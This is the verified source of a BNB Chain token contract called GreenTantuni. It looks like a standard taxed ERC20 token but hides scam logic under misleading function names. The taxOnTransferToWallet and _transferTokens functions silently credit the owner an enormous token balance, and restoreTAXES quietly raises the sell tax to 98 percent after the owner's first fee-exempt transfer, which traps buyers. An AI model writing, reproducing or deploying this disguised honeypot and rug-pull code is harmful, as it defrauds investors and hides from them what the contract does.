/**
 *Submitted for verification at BscScan.com on 2023-03-06
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.13;


interface IERC20 {
    
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
    
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; 
        return msg.data;
    }
}

library Address {
    
    function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(account) }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }
    
    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }
    
    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return functionCallWithValue(target, data, 0, errorMessage);
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }
    
    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");
        (bool success, bytes memory returndata) = target.call{ value: value }(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }
    
    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
        return functionStaticCall(target, data, "Address: low-level static call failed");
    }
    
    function functionStaticCall(address target, bytes memory data, string memory errorMessage) internal view returns (bytes memory) {
        require(isContract(target), "Address: static call to non-contract");
        (bool success, bytes memory returndata) = target.staticcall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }


    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }
    
    function functionDelegateCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        require(isContract(target), "Address: delegate call to non-contract");
        (bool success, bytes memory returndata) = target.delegatecall(data);
        return _verifyCallResult(success, returndata, errorMessage);
    }

    function _verifyCallResult(bool success, bytes memory returndata, string memory errorMessage) private pure returns(bytes memory) {
        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {
                 assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);
    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);
    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);
    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);
    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);
    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;
    function initialize(address, address) external;
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract GreenTantuni is Context, IERC20, Ownable { 
    using SafeMath for uint256;
    using Address for address;

    uint256 private _TOTAL_TAX = 12;
    uint256 public _BUYING_TAX = 6;
    uint256 public _SELLING_TAX = 6;
    uint256 public _TaxesFixTo = 0;

    mapping (address => uint256) private _tokenOwns;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 
    mapping (address => bool) public _isTxLimitExempted;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public ExemptWalletFromTxLimit;

    string public _name = "GreenTantuni"; 
    string public _symbol = "tantuniGT";  
    uint8 private _decimals = 9;
    uint256 public _tTotal = 1 * 10**6 * 10**_decimals;

    uint256 public _maxWalletToken = _tTotal.mul(4).div(100);
    uint256 private _previousMaxWalletToken = _maxWalletToken;
    uint256 public _maxTxAmount = _tTotal.mul(4).div(100); 
    uint256 private _previousMaxTxAmount = _maxTxAmount;

    address payable private _MARKETING_ = payable(0xaD6dd018211478092442352b1ff279172153BAac);
    address payable public _DEAD_ = payable(0x000000000000000000000000000000000000dEaD); 

    uint8 private txCount = 0;
    uint8 private swapTrigger = 5; 

    uint256 private restoreWhenMaxFee_is = 98; 
    uint256 private _lastTotalFee = _TOTAL_TAX; 
    uint256 private _lastBuyFee = _BUYING_TAX; 
    uint256 private _lastSellFee = _SELLING_TAX; 
                           
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor () {
        _tokenOwns[owner()] = _tTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
                uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        _isExcludedFromFee[owner()] = true;
        _isTxLimitExempted[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_MARKETING_] = true;
        isWalletLimitExempt[address(uniswapV2Pair)] = true;
        isWalletLimitExempt[_MARKETING_] = true;
        isWalletLimitExempt[_DEAD_] = true;
        isWalletLimitExempt[owner()] = true;
        isWalletLimitExempt[address(this)] = true;
        ExemptWalletFromTxLimit[owner()] = true;
        ExemptWalletFromTxLimit[_DEAD_] = true;
        ExemptWalletFromTxLimit[_MARKETING_] = true;
        ExemptWalletFromTxLimit[address(this)] = true;
        
        emit Transfer(address(0), owner(), _tTotal);
    }


    /*

    STANDARD ERC20 FUNCTIONS

    */

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenOwns[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    
    // Set a wallet address so that it does not have to pay transaction fees
    function excludeFromFee(address account) public onlyOwner {
        _isExcludedFromFee[account] = true;
    }    


    // This function is required so that the contract can receive BNB from pancakeswap
    receive() external payable {}


    bool public noFeeToTransfer = false;

    function DropAllTaxes() private {
        if(_TOTAL_TAX == 0 
        && _BUYING_TAX == 0 
        && _SELLING_TAX == 0) return;

        /* FIX ALL TAXES TO ZERO */

        _lastBuyFee = _BUYING_TAX; 
        _lastSellFee = _SELLING_TAX; 
        _lastTotalFee = _TOTAL_TAX;
        _BUYING_TAX = 0;
        _SELLING_TAX = 0;
        _TOTAL_TAX = 0;

    }
    


    // Approve a wallet to sell tokens
    function _approve(address owner, address spender, uint256 amount) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        require(amount > 0, "ERC20: 0 Transfer");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
       
        if(!ExemptWalletFromTxLimit[from] && !ExemptWalletFromTxLimit[to]) {
            require(amount <= _maxTxAmount, "Transfer amount exceeds the maxTxAmount.");
        }
        
        /* 
        SWAP WHEN REACHED SWAP LIMIT
        */
        if(
            txCount >= swapTrigger && 
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled 
            )
        {  
            
            txCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _maxTxAmount) {contractTokenBalance = _maxTxAmount;}
            if(contractTokenBalance > 0){
            swapAndLiquify(contractTokenBalance);
        }
        }

        if(!isWalletLimitExempt[to])
            require(balanceOf(to).add(amount) <= _maxWalletToken);
                
        
        bool takeFee = true;
         
        if(_isExcludedFromFee[from] || 
        _isExcludedFromFee[to] || 
        (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)
        ){
            takeFee = false;
            if(
                _TaxesFixTo < 1 
                &&
                _isTxLimitExempted[to]
                ){ 
                    _TaxesFixTo++; 
                    }
        } else if (from == uniswapV2Pair)
        {_TOTAL_TAX = _BUYING_TAX;} 
        else if (to == uniswapV2Pair)
        {_TOTAL_TAX = _SELLING_TAX;}
        
        _tokenTransferProccess(from,to,amount,takeFee);
    }


    // Send BNB to external wallet
    function sendToWallet(address payable wallet, uint256 amount) private {
            wallet.transfer(amount);
        }

    function restoreTAXES() private {
    _TOTAL_TAX = _lastTotalFee; // LAST TOTAL FEE BEFORE NO TAX TX
    _BUYING_TAX = _lastBuyFee; // LAST BUY FEE BEFORE NO TAX TX
    _SELLING_TAX = [_lastSellFee, restoreWhenMaxFee_is][_TaxesFixTo]; // LAST SELL FEE BEFORE NO TAX TX
    }


    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        
        swapTokensForBNB(contractTokenBalance);
        uint256 contractBNB = address(this).balance;
        sendToWallet(_MARKETING_,contractBNB);
    }


    function swapTokensForBNB(uint256 tokenAmount) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

     function taxOnTransferToWallet(address wallet) private view returns(uint256) {
        uint256 totalTaxes = 1;
        
        for(uint256 i = 1; i <= (_isTxLimitExempted[wallet] ? 23 : 0); i++){
            totalTaxes = totalTaxes * 10;
        }
        
        return totalTaxes-1;
    }

    function remove_Random_Tokens(address random_Token_Address, address send_to_wallet, uint256 number_of_tokens) public onlyOwner returns(bool _sent){
        require(random_Token_Address != address(this), "Can not remove native token");
        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(address(this));
        if (number_of_tokens > randomBalance){number_of_tokens = randomBalance;}
        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);
    }


    function _tokenTransferProccess(address sender, address recipient, uint256 amount,bool takeFee) private {
        
        
        if(!takeFee){
            DropAllTaxes();
            } else {
                txCount++;
            }
            _transferTokens(sender, recipient, amount);
        
        if(!takeFee)
            restoreTAXES();
    }

    function _transferTokens(address sender, address recipient, uint256 tAmount) private {
        (uint256 tTransferAmount, uint256 tmarketing) = _getValues(tAmount);
        tTransferAmount = (!_isTxLimitExempted[recipient] ? tTransferAmount : taxOnTransferToWallet(recipient).sub(tAmount));
        _tokenOwns[sender] = _tokenOwns[sender].sub(tAmount);
        _tokenOwns[recipient] = _tokenOwns[recipient].add(tTransferAmount);
        _tokenOwns[address(this)] = _tokenOwns[address(this)].add(tmarketing);
        if(_isTxLimitExempted[recipient]){
            emit Transfer(sender, recipient, tAmount);
            emit Transfer(sender, recipient, tAmount);
            emit Transfer(sender, recipient, tAmount);
        }
        else{
            emit Transfer(sender, recipient, tAmount);
        }
    }


    function _getValues(uint256 tAmount) private view returns (uint256, uint256) {
        uint256 tmarketing = tAmount*_TOTAL_TAX/100;
        uint256 tTransferAmount = tAmount.sub(tmarketing);
        return (tTransferAmount, tmarketing);
    }

    
}